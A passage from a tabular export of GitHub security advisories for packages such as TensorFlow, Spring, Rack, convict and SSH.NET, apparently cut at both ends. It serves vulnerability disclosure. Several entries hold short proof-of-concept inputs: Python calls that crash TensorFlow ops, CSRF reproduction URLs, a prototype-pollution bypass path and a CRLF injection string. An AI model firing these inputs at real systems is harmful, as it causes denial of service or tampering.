The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",pip
2487,20741,tensorflow,GHSA-hrg5-737c-2p56,CVE-2022-29197,https://github.com/advisories/GHSA-hrg5-737c-2p56,moderate,2022-05-24 22:08:20 UTC,Missing validation causes denial of service via `UnsortedSegmentJoin`,"### Impact
The implementation of [`tf.raw_ops.UnsortedSegmentJoin`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/unsorted_segment_join_op.cc#L92-L95) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import tensorflow as tf

tf.raw_ops.UnsortedSegmentJoin(
  inputs=tf.constant(""this"", shape=[12], dtype=tf.string),
  segment_ids=tf.constant(0, shape=[12], dtype=tf.int64),
  num_segments=tf.constant(0, shape=[12], dtype=tf.int64))
``` 
  
The code assumes `num_segments` is a scalar but there is no validation for this before accessing its value:

```cc
const Tensor& num_segments_tensor = context->input(2);
OP_REQUIRES(context, num_segments_tensor.NumElements() != 0,
            errors::InvalidArgument(""Number of segments cannot be empty.""));
auto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();
``` 

### Patches
We have patched the issue in GitHub commit [13d38a07ce9143e044aa737cfd7bb759d0e9b400](https://github.com/tensorflow/tensorflow/commit/13d38a07ce9143e044aa737cfd7bb759d0e9b400).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.
",pip
2488,20741,tensorflow,GHSA-5v77-j66x-4c4g,CVE-2022-29196,https://github.com/advisories/GHSA-5v77-j66x-4c4g,moderate,2022-05-24 22:07:44 UTC,Missing validation causes denial of service via `Conv3DBackpropFilterV2`,"### Impact
The implementation of [`tf.raw_ops.Conv3DBackpropFilterV2`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/conv_grad_ops_3d.cc) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import tensorflow as tf

tf.raw_ops.Conv3DBackpropFilterV2(
  input=tf.constant(.5053710941, shape=[2,2,2,2,1], dtype=tf.float16),
  filter_sizes=tf.constant(0, shape=[], dtype=tf.int32),
  out_backprop=tf.constant(.5053710941, shape=[2,2,2,2,1], dtype=tf.float16),
  strides=[1, 1, 1, 1, 1],
  padding=""VALID"",
  data_format=""NDHWC"",
  dilations=[1, 1, 1, 1, 1])
```
  
The code does not validate that the `filter_sizes` argument is a vector.
  
### Patches
We have patched the issue in GitHub commit [174c5096f303d5be7ed2ca2662b08371bff4ab88](https://github.com/tensorflow/tensorflow/commit/174c5096f303d5be7ed2ca2662b08371bff4ab88).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.
    
### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",pip
2489,20741,tensorflow,GHSA-h48f-q7rw-hvr7,CVE-2022-29195,https://github.com/advisories/GHSA-h48f-q7rw-hvr7,moderate,2022-05-24 22:07:24 UTC,Missing validation causes denial of service via `StagePeek`,"### Impact
The implementation of [`tf.raw_ops.StagePeek`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/stage_op.cc#L261) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import tensorflow as tf

index = tf.constant([], shape=[0], dtype=tf.int32)
tf.raw_ops.StagePeek(index=index, dtypes=[tf.int32])
```
  
The code assumes `index` is a scalar but there is no validation for this before accessing its value:
  
```cc
std::size_t index = ctx->input(0).scalar<int>()();
``` 

### Patches
We have patched the issue in GitHub commit [cebe3c45d76357d201c65bdbbf0dbe6e8a63bbdb](https://github.com/tensorflow/tensorflow/commit/cebe3c45d76357d201c65bdbbf0dbe6e8a63bbdb).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",pip
2490,20741,tensorflow,GHSA-h5g4-ppwx-48q2,CVE-2022-29194,https://github.com/advisories/GHSA-h5g4-ppwx-48q2,moderate,2022-05-24 22:06:50 UTC,Missing validation causes denial of service via `DeleteSessionTensor`,"### Impact
The implementation of [`tf.raw_ops.DeleteSessionTensor`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/session_ops.cc#L128-L144) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import tensorflow as tf

handle = tf.constant(""[]"", shape=[0], dtype=tf.string)
tf.raw_ops.DeleteSessionTensor(handle=handle)
```
  
The code assumes `handle` is a scalar but there is no validation for this:
  
```cc
    const Tensor& handle = ctx->input(0);
    const string& name = handle.scalar<tstring>()();
```

### Patches
We have patched the issue in GitHub commit [cff267650c6a1b266e4b4500f69fbc49cdd773c5](https://github.com/tensorflow/tensorflow/commit/cff267650c6a1b266e4b4500f69fbc49cdd773c5).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",pip
2491,20741,tensorflow,GHSA-h2wq-prv9-2f56,CVE-2022-29192,https://github.com/advisories/GHSA-h2wq-prv9-2f56,moderate,2022-05-24 22:06:26 UTC,Missing validation crashes `QuantizeAndDequantizeV4Grad`,"### Impact
The implementation of [`tf.raw_ops.QuantizeAndDequantizeV4Grad`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L148-L226) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import tensorflow as tf

tf.raw_ops.QuantizeAndDequantizeV4Grad(
  gradients=tf.constant(1, shape=[2,2], dtype=tf.float64),
  input=tf.constant(1, shape=[2,2], dtype=tf.float64),
  input_min=tf.constant([], shape=[0], dtype=tf.float64),
  input_max=tf.constant(-10, shape=[], dtype=tf.float64),
  axis=-1)
```

The code assumes `input_min` and `input_max` are scalars but there is no validation for this.

### Patches
We have patched the issue in GitHub commit [098e7762d909bac47ce1dbabe6dfd06294cb9d58](https://github.com/tensorflow/tensorflow/commit/098e7762d909bac47ce1dbabe6dfd06294cb9d58).
    
The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",pip
2492,20741,tensorflow,GHSA-fv25-wrff-wf86,CVE-2022-29191,https://github.com/advisories/GHSA-fv25-wrff-wf86,moderate,2022-05-24 22:05:59 UTC,Missing validation causes denial of service via `GetSessionTensor`,"### Impact
The implementation of [`tf.raw_ops.GetSessionTensor`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/session_ops.cc#L94-L112) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import tensorflow as tf

handle = tf.constant(""[]"", shape=[0], dtype=tf.string)
tf.raw_ops.GetSessionTensor(handle=handle)
```
  
The code assumes `handle` is a scalar but there is no validation for this:
  
```cc
    const Tensor& handle = ctx->input(0);
    const string& name = handle.scalar<tstring>()();
```

### Patches
We have patched the issue in GitHub commit [48305e8ffe5246d67570b64096a96f8e315a7281](https://github.com/tensorflow/tensorflow/commit/48305e8ffe5246d67570b64096a96f8e315a7281).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",pip
2493,20741,tensorflow,GHSA-2p9q-h29j-3f5v,CVE-2022-29193,https://github.com/advisories/GHSA-2p9q-h29j-3f5v,moderate,2022-05-24 16:38:47 UTC,Missing validation causes `TensorSummaryV2` to crash,"### Impact
The implementation of [`tf.raw_ops.TensorSummaryV2`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/summary_tensor_op.cc#L33-L58) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import numpy as np
import tensorflow as tf

tf.raw_ops.TensorSummaryV2(
  tag=np.array('test'),
  tensor=np.array(3),
  serialized_summary_metadata=tf.io.encode_base64(np.empty((0))))
```

The code assumes `axis` is a scalar but there is no validation for this.

```cc
    const Tensor& serialized_summary_metadata_tensor = c->input(2);
    // ...
    ParseFromTString(serialized_summary_metadata_tensor.scalar<tstring>()(),
                     v->mutable_metadata());
``` 

### Patches
We have patched the issue in GitHub commit [290bb05c80c327ed74fae1d089f1001b1e2a4ef7](https://github.com/tensorflow/tensorflow/commit/290bb05c80c327ed74fae1d089f1001b1e2a4ef7).
    
The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.
    
### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University and Hong Jin from Singapore Management University.",pip
2494,18550,convict,GHSA-jjf5-wx3j-3fv7,CVE-2022-21190,https://github.com/advisories/GHSA-jjf5-wx3j-3fv7,critical,2022-05-14 00:01:09 UTC,Prototype Pollution in convict,"This affects the package convict before 6.2.3. This is a bypass of [CVE-2022-22143](https://security.snyk.io/vuln/SNYK-JS-CONVICT-2340604). The [fix](https://github.com/mozilla/node-convict/commit/3b86be087d8f14681a9c889d45da7fe3ad9cd880) introduced, relies on the startsWith method and does not prevent the vulnerability: before splitting the path, it checks if it starts with __proto__ or this.constructor.prototype. To bypass this check it's possible to prepend the dangerous paths with any string value followed by a dot, like for example foo.__proto__ or foo.this.constructor.prototype.",npm
2495,34497,io.undertow:undertow-core,GHSA-mfhv-gwf8-4m88,CVE-2021-3597,https://github.com/advisories/GHSA-mfhv-gwf8-4m88,moderate,2022-05-25 00:00:21 UTC,undertow Race Condition vulnerability,"A flaw was found in undertow. The HTTP2SourceChannel fails to write the final frame under some circumstances, resulting in a denial of service. The highest threat from this vulnerability is availability. This flaw affects Undertow versions prior to 2.0.35.SP1, prior to 2.2.6.SP1, prior to 2.2.7.SP1, prior to 2.0.36.SP1, prior to 2.2.9.Final and prior to 2.0.39.Final.",maven
2496,34497,io.undertow:undertow-core,GHSA-rf6q-vx79-mjxr,CVE-2021-3629,https://github.com/advisories/GHSA-rf6q-vx79-mjxr,high,2022-05-25 00:00:22 UTC,Undertow Uncontrolled Resource Consumption,A flaw was found in Undertow. A potential security issue in flow control handling by the browser over http/2 may potentially cause overhead or a denial of service in the server. The highest threat from this vulnerability is availability. This flaw affects Undertow versions prior to 2.0.40.Final and prior to 2.2.11.Final.,maven
2497,36530,com.vaadin:vaadin,GHSA-qfr3-323w-qv27,CVE-2022-29567,https://github.com/advisories/GHSA-qfr3-323w-qv27,moderate,2022-05-25 22:40:03 UTC,Possible information disclosure inside TreeGrid component with default data provider,"### Description

The default configuration of a TreeGrid component uses Object::toString as a key on the client-side and server communication in Vaadin 14.8.5 through 14.8.9, 22.0.6 through 22.0.14, 23.0.0.beta2 through 23.0.8 and 23.1.0.alpha1 through 23.1.0.alpha4, resulting in potential information disclosure of values that should not be available on the client-side.
",maven
2498,35317,org.apache.maven.shared:maven-shared-utils,GHSA-rhgr-952r-6p8q,CVE-2022-29599,https://github.com/advisories/GHSA-rhgr-952r-6p8q,critical,2022-05-24 00:01:49 UTC,Command injection in Apache Maven maven-shared-utils,"In Apache Maven maven-shared-utils prior to version 3.3.3, the Commandline class can emit double-quoted strings without proper escaping, allowing shell injection attacks.",maven
2499,33906,org.springframework:spring-core,GHSA-hh26-6xwr-ggv7,CVE-2022-22970,https://github.com/advisories/GHSA-hh26-6xwr-ggv7,high,2022-05-13 00:00:28 UTC,Denial of service in Spring Framework,"In spring framework versions prior to 5.3.20+ , 5.2.22+ and old unsupported versions, applications that handle file uploads are vulnerable to DoS attack if they rely on data binding to set a MultipartFile or javax.servlet.Part to a field in a model object.",maven
2500,33996,org.apache.derby:derby,GHSA-rp7r-79rm-2758,CVE-2005-4849,https://github.com/advisories/GHSA-rp7r-79rm-2758,moderate,2022-05-01 02:31:27 UTC,Apache Derby exposes user and password attributes,"Apache Derby before 10.1.2.1 exposes the (1) user and (2) password attributes in cleartext via (a) the RDBNAM parameter of the ACCSEC command and (b) the output of the DatabaseMetaData.getURL function, which allows context-dependent attackers to obtain sensitive information.",maven
2501,34025,org.springframework.security:spring-security-core,GHSA-wx54-3278-m5g4,CVE-2022-22976,https://github.com/advisories/GHSA-wx54-3278-m5g4,moderate,2022-05-20 00:00:38 UTC,Integer overflow in BCrypt class in Spring Security,"Spring Security versions 5.5.x prior to 5.5.7, 5.6.x prior to 5.6.4, and earlier unsupported versions contain an integer overflow vulnerability. When using the BCrypt class with the maximum work factor (31), the encoder does not perform any salt rounds, due to an integer overflow error. The default settings are not affected by this CVE. The only in circumstances where the BCryptPasswordEncoder has been configured with the maximum work factor are affected. Due to current limitations in computer hardware, the use of such a high work factor is computationally impractical. You need to be using BCrypt with a work factor of 31 to be impacted.",maven
2502,34025,org.springframework.security:spring-security-core,GHSA-hh32-7344-cg2f,CVE-2022-22978,https://github.com/advisories/GHSA-hh32-7344-cg2f,critical,2022-05-20 00:00:39 UTC,Authorization bypass in Spring Security,"In Spring Security versions 5.5.6 and 5.5.7 and older unsupported versions, RegexRequestMatcher can easily be misconfigured to be bypassed on some servlet containers. Applications using RegexRequestMatcher with `.` in the regular expression are possibly vulnerable to an authorization bypass.",maven
2503,20741,tensorflow,GHSA-mw6j-hh29-h379,,https://github.com/advisories/GHSA-mw6j-hh29-h379,moderate,2022-05-25 19:33:50 UTC,`CHECK` failure in depthwise ops via overflows,"### Impact
The implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:

```python
import tensorflow as tf

input = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
filter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)
out_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
tf.raw_ops.DepthwiseConv2dNativeBackpropFilter(
    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=""SAME"")
```
  
This is another instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).
  
### Patches
We have patched the issue in GitHub commit [3796cc4fcd93ae55812a457abc96dcd55fbb854b](https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",pip
2504,15835,grunt,GHSA-rm36-94g8-835r,CVE-2022-1537,https://github.com/advisories/GHSA-rm36-94g8-835r,high,2022-05-11 00:01:37 UTC,Race Condition in Grunt,file.copy operations in GruntJS are vulnerable to a TOCTOU race condition leading to arbitrary file write in GitHub repository gruntjs/grunt prior to 1.5.3. This vulnerability is capable of arbitrary file writes which can lead to local privilege escalation to the GruntJS user if a lower-privileged user has write access to both source and destination directories as the lower-privileged user can create a symlink to the GruntJS user's .bashrc file or replace /etc/shadow file if the GruntJS user is root.,npm
2505,20092,ansible,GHSA-5rrg-rr89-x9mv,CVE-2021-20228,https://github.com/advisories/GHSA-5rrg-rr89-x9mv,high,2022-05-25 19:22:34 UTC,Ansible vulnerable to Exposure of Sensitive Information,"A flaw was found in the Ansible Engine 2.9.18, where sensitive info is not masked by default and is not protected by the no_log feature when using the sub-option feature of the basic.py module. This flaw allows an attacker to obtain sensitive information. The highest threat from this vulnerability is to confidentiality.",pip
2506,35084,com.jfinal:jfinal,GHSA-279p-pc38-xx4p,CVE-2019-17352,https://github.com/advisories/GHSA-279p-pc38-xx4p,high,2022-05-25 19:21:15 UTC,JFinal file validation vulnerability,"In JFinal cos before 2019-08-13, as used in JFinal 4.4, there is a vulnerability that can bypass the isSafeFile() function: one can upload any type of file. For example, a .jsp file may be stored and almost immediately deleted, but this deletion step does not occur for certain exceptions.",maven
2507,18839,rack,GHSA-hxqx-xwvh-44m2,CVE-2022-30122,https://github.com/advisories/GHSA-hxqx-xwvh-44m2,moderate,2022-05-27 16:36:52 UTC,Denial of Service Vulnerability in Rack Multipart Parsing,"There is a possible denial of service vulnerability in the multipart parsing
component of Rack.  This vulnerability has been assigned the CVE identifier
CVE-2022-30122.

Versions Affected:  >= 1.2
Not affected:       < 1.2
Fixed Versions:     2.0.9.1, 2.1.4.1, 2.2.3.1

## Impact
Carefully crafted multipart POST requests can cause Rack's multipart parser to
take much longer than expected, leading to a possible denial of service
vulnerability.

Impacted code will use Rack's multipart parser to parse multipart posts.  This
includes directly using the multipart parser like this:

```
params = Rack::Multipart.parse_multipart(env)
```

But it also includes reading POST data from a Rack request object like this:

```
p request.POST # read POST data
p request.params # reads both query params and POST data
```

All users running an affected release should either upgrade or use one of the
workarounds immediately.

## Workarounds
There are no feasible workarounds for this issue.
",rubygems
2508,18839,rack,GHSA-wq4h-7r42-5hrr,CVE-2022-30123,https://github.com/advisories/GHSA-wq4h-7r42-5hrr,high,2022-05-27 16:36:51 UTC,Possible shell escape sequence injection vulnerability in Rack,"There is a possible shell escape sequence injection vulnerability in the Lint
and CommonLogger components of Rack.  This vulnerability has been assigned the
CVE identifier CVE-2022-30123.

Versions Affected:  All.
Not affected:       None
Fixed Versions:     2.0.9.1, 2.1.4.1, 2.2.3.1

## Impact
Carefully crafted requests can cause shell escape sequences to be written to
the terminal via Rack's Lint middleware and CommonLogger middleware.  These
escape sequences can be leveraged to possibly execute commands in the victim's
terminal.

Impacted applications will have either of these middleware installed, and
vulnerable apps may have something like this:

```
use Rack::Lint
```

Or

```
use Rack::CommonLogger
```

All users running an affected release should either upgrade or use one of the
workarounds immediately.

## Workarounds
Remove these middleware from your application
",rubygems
2509,34830,org.simpleframework:simple-xml,GHSA-f5qf-vh69-9q4r,CVE-2017-1000190,https://github.com/advisories/GHSA-f5qf-vh69-9q4r,critical,2022-05-14 00:55:56 UTC,SimpleXML vulnerable to XML External Entity (XXE),"SimpleXML (latest version 2.7.1) is vulnerable to an XXE vulnerability resulting SSRF, information disclosure, DoS and so on.",maven
2510,19975,bottle,GHSA-j6f7-hghw-g437,CVE-2016-9964,https://github.com/advisories/GHSA-j6f7-hghw-g437,moderate,2022-05-17 03:05:15 UTC,bottle.py vulnerable to CRLF Injection,"bottle.py is a fast and simple micro-framework for python web-applications. redirect() in bottle.py in bottle 0.12.10 doesn't filter a ""\r\n"" sequence, which leads to a CRLF attack, as demonstrated by a redirect(""233\r\nSet-Cookie: name=salt"") call.",pip
2511,19844,Pillow,GHSA-hr8g-f6r6-mr22,CVE-2022-30595,https://github.com/advisories/GHSA-hr8g-f6r6-mr22,high,2022-05-26 00:01:27 UTC,Buffer over-flow in Pillow,"When reading a TGA file with RLE packets that cross scan lines, Pillow reads the information past the end of the first line without deducting that from the length of the remaining file data. This vulnerability was introduced in Pillow 9.1.0, and can cause a heap buffer overflow.

Opening an image with a zero or negative height has been found to bypass a decompression bomb check. This will now raise a SyntaxError instead, in turn raising a PIL.UnidentifiedImageError.",pip
2512,27293,solidus_backend,GHSA-8639-qx56-r428,CVE-2022-31000,https://github.com/advisories/GHSA-8639-qx56-r428,low,2022-06-01 20:26:37 UTC,CSRF allows attacker to finalize/unfinalize order adjustments in solidus_backend,"### Impact
CSRF vulnerability allowing attackers to change the state of an order's adjustments if they hold its number, and the execution happens on a store administrator's computer.

Reproduction steps:
- Take an order's number.
- Log in as an administrator.
- Visit that order's adjustments section (_Orders -> {Click on number} -> Adjustments_) and check that its adjustments are finalized (closed padlock under the **State** column).
- On another tab, visit `{your_site_url}/admin/orders/{order_number}/adjustments/unfinalize`.
- Notice how the adjustments are unfinalized (open padlock), even if the previous was a `GET` request which could have been linked from any other site.
- Visit `{your_site_url}/admin/orders/{order_number}/adjustments/finalize`.
- Notice how the adjustments are again finalized.

That happened because both routes were handled as `GET` requests, which are skipped by Rails anti-forgery protection.

### Patches
Users should upgrade to solidus_backend v3.1.6, v3.0.6, or v2.11.16, depending on the major and minor versions in use.

### References
- [Rails CSRF protection](https://api.rubyonrails.org/classes/ActionController/RequestForgeryProtection.html).

### For more information
If you have any questions or comments about this advisory:

- Open an [issue](https://github.com/solidusio/solidus/issues) or a [discussion](https://github.com/solidusio/solidus/discussions) in Solidus.
- Email us at [security@solidus.io](mailto:security@soliidus.io)
- Contact the core team on [Slack](http://slack.solidus.io/)
",rubygems
2513,16806,sharp,GHSA-gp95-ppv5-3jc5,CVE-2022-29256,https://github.com/advisories/GHSA-gp95-ppv5-3jc5,moderate,2022-06-01 19:58:29 UTC,sharp vulnerable to Command Injection in post-installation over build environment,"There's a possible vulnerability in logic that is run only at `npm install` time when installing versions of `sharp` prior to the latest v0.30.5.

This is not part of any runtime code, does not affect Windows users at all, and is unlikely to affect anyone that already cares about the security of their build environment. However, out of an abundance of caution, I've created this advisory.

If an attacker has the ability to set the value of the `PKG_CONFIG_PATH` environment variable in a build environment then they might be able to use this to inject an arbitrary command at `npm install` time.

I've used the Common Vulnerability Scoring System (CVSS) calculator to determine the maximum possible impact, which suggests a ""medium"" score of 5.9, but for most people the real impact will be dealing with the noise from automated security tooling that this advisory will bring.

[`AV:L/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:R/MS:X/MC:X/MI:X/MA:X`](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:R/MS:X/MC:X/MI:X/MA:X&version=3.1)

This problem was fixed in commit a6aeef6 and published as part of `sharp` v0.30.5.

Thank you very much to @dwisiswant0 for the responsible disclosure.

Remember: if an attacker has control over environment variables in your build environment then you have a bigger problem to deal with than this issue.
",npm
2514,13441,SSH.NET,GHSA-72p8-v4hg-v45p,CVE-2022-29245,https://github.com/advisories/GHSA-72p8-v4hg-v45p,moderate,2022-06-01 19:50:15 UTC,Weak private key generation in SSH.NET,"During an **X25519** key exchange, the client’s private is generated with [**System.Random**](https://docs.microsoft.com/en-us/dotnet/api/system.random):

```cs
var rnd = new Random();
_privateKey = new byte[MontgomeryCurve25519.PrivateKeySizeInBytes];
rnd.NextBytes(_privateKey);
```

Source: [KeyExchangeECCurve25519.cs](https://github.com/sshnet/SSH.NET/blob/bc99ada7da3f05f50d9379f2644941d91d5bf05a/src/Renci.SshNet/Security/KeyExchangeECCurve25519.cs#L51)  
Source commit: https://github.com/sshnet/SSH.NET/commit/b58a11c0da55da1f5bad46faad2e9b71b7cb35b3

[**System.Random**](https://docs.microsoft.com/en-us/dotnet/api/system.random) is not a cryptographically secure random number generator, it must therefore not be used for cryptographic purposes.

### Impact
When establishing an SSH connection to a remote host, during the X25519 key exchange, the private key is generated with
a weak random number generator whose seed can be bruteforced. This allows an attacker able to eavesdrop the
communications to decrypt them.

### Workarounds
To ensure you're not affected by this vulnerability, you can disable support for `curve25519-sha256` and `curve25519-sha256@libssh.org` key exchange algorithms by invoking the following method before a connection is established:
```cs
private static void RemoveUnsecureKEX(BaseClient client)
{
    client.ConnectionInfo.KeyExchangeAlgorithms.Remove(""curve25519-sha256"");
    client.ConnectionInfo.KeyExchangeAlgorithms.Remove(""curve25519-sha256@libssh.org"");
}
```

### Thanks

This issue was initially reported by **Siemens AG, Digital Industries**, shortly followed by @yaumn-synacktiv.",nuget
2515,19936,html5lib,GHSA-8f6m-gfq9-g33v,CVE-2016-9910,https://github.com/advisories/GHSA-8f6m-gfq9-g33v,moderate,2022-05-17 02:57:57 UTC,Cross-site Scripting in html5lib,"The serializer in html5lib before 0.99999999 might allow remote attackers to conduct cross-site scripting (XSS) attacks by leveraging mishandling of special characters in attribute values, a different vulnerability than CVE-2016-9909.",pip
2516,20080,waitress,GHSA-f5x9-8jwc-25rw,CVE-2022-31015,https://github.com/advisories/GHSA-f5x9-8jwc-25rw,moderate,2022-06-02 20:37:48 UTC,Uncaught Exception (due to a data race) leads to process termination in Waitress,"### Impact

Waitress may terminate early due to a thread closing a socket while the main thread is about to call select(). This will lead to the main thread raising an exception that is not handled and then causing the entire application to be killed.

### Patches

This issue has been fixed in Waitress 2.1.2 by no longer allowing the WSGI thread to close the socket, instead it is always delegated to the main thread.

### Workarounds

There is no work-around, however users using waitress behind a reverse proxy server are less likely to have issues if the reverse proxy always reads the full response.

### For more information

If you have any questions or comments about this advisory:
* Open an issue in https://github.com/Pylons/waitress/issues (if not sensitive or security related)
* email the Pylons Security mailing list: [pylons-project-security@googlegroups.com](mailto:pylons-project-security@googlegroups.com) (if security related)
",pip
2517,16784,protobufjs,GHSA-g954-5hwp-pp24,CVE-2022-25878,https://github.com/advisories/GHSA-g954-5hwp-pp24,high,2022-05-28 00:00:20 UTC,Prototype Pollution in protobufjs,"The package protobufjs is vulnerable to Prototype Pollution, which can allow an attacker to add/modify properties of the Object.prototype. Versions after and including 6.10.0 until 6.10.3 and after and including 6.11.0 until 6.11.3 are vulnerable.

This vulnerability can occur in multiple ways:
1. by providing untrusted user input to util.setProperty or to ReflectionObject.setParsedOption functions
2. by parsing/loading .proto files


",npm
2518,15904,@angular/core,GHSA-c75v-2vq8-878f,CVE-2021-4231,https://github.com/advisories/GHSA-c75v-2vq8-878f,moderate,2022-05-27 00:01:08 UTC,Cross site scripting in Angular,A vulnerability was found in Angular up to 11.0.4/11.1.0-next.2. It has been classified as problematic. Affected is the handling of comments. The manipulation leads to cross site scripting. It is possible to launch the attack remotely but it might require an authentication first. Upgrading to version 11.0.5 and 11.1.0-next.3 is able to address this issue. The name of the patch is ba8da742e3b243e8f43d4c63aa842b44e14f2b09. It is recommended to upgrade the affected component.,npm
2519,16105,npm,GHSA-hj9c-8jmm-8c52,CVE-2022-29244,https://github.com/advisories/GHSA-hj9c-8jmm-8c52,high,2022-06-02 15:37:27 UTC,Packing does not respect root-level ignore files in workspaces,"### Impact
`npm pack` ignores root-level `.gitignore` & `.npmignore` file exclusion directives when run in a workspace or with a workspace flag (ie. `--workspaces`, `--workspace=<name>`). Anyone who has run `npm pack` or `npm publish` with workspaces, as of [v7.9.0](https://github.com/npm/cli/releases/tag/v7.9.0) & [v7.13.0](https://github.com/npm/cli/releases/tag/v7.13.0) respectively, may be affected and have published files into the npm registry they did not intend to include.

### Patch
- Upgrade to the latest, patched version of `npm` ([`v8.11.0`](https://github.com/npm/cli/releases/tag/v8.11.0) or greater), run: `npm i -g npm@latest`
- Node.js versions [`v16.15.1`](https://github.com/nodejs/node/releases/tag/v16.15.1), [`v17.19.1`](https://github.com/nodejs/node/releases/tag/v17.9.1) & [`v18.3.0`](https://github.com/nodejs/node/releases/tag/v18.3.0) include the patched `v8.11.0` version of `npm`

#### Steps to take to see if you're impacted
1. Run `npm publish --dry-run` or `npm pack` with an `npm` version `>=7.9.0` & `<8.11.0` inside the project's root directory using a workspace flag like: `--workspaces` or `--workspace=<name>` (ex. `npm pack --workspace=foo`)
2. Check the output in your terminal which will list the package contents (note: `tar -tvf <package-on-disk>` also works)
3. If you find that there are files included you did not expect, you should:
